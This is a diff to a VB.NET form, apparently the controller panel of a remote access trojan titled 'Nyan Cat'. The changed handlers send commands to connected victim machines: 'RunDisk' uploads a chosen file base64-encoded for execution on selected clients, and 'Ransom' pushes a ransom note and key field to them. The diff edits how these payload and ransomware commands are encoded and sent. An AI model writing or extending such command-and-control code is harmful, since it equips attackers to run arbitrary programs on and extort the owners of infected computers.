@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##           N Y A N   C A T  ||  Last edit MAR./09/2018        ##
+'##           N Y A N   C A T  ||  Last edit MAR./10/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -45,6 +45,7 @@ Public Class Form1
 #Region "Events"
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
         TOS.ShowDialog()
         SelPORT.ShowDialog()
 
@@ -93,10 +94,7 @@ Public Class Form1
 
         Fix()
 
-
     End Sub
-
-
 
     Private Sub Form1_Closing(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
         On Error Resume Next
@@ -232,9 +230,12 @@ Public Class Form1
             End With
 
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+
                 For Each l As ListViewItem In Me.L1.SelectedItems
                     Dim C As C = CType(l.Tag, C)
-                    C.SendText("RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
+                    Dim CM() As Byte = FN.GB("RunDisk" & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
+                    C.Send(CM)
+
                 Next
             End If
         Catch ex As Exception
@@ -350,7 +351,7 @@ Public Class Form1
 
                 For Each l As ListViewItem In Me.L1.SelectedItems
                     Dim C As C = CType(l.Tag, C)
-                    C.SendText("Ransom" + SPL + R.RichTextBox1.Text + SPL + Convert.ToBase64String(IO.File.ReadAllBytes(R.o.FileName)))
+                    C.SendText("Ransom" + SPL + R.RichTextBox1.Text + SPL + R.Textbox1.Text)
 
                 Next
             End If
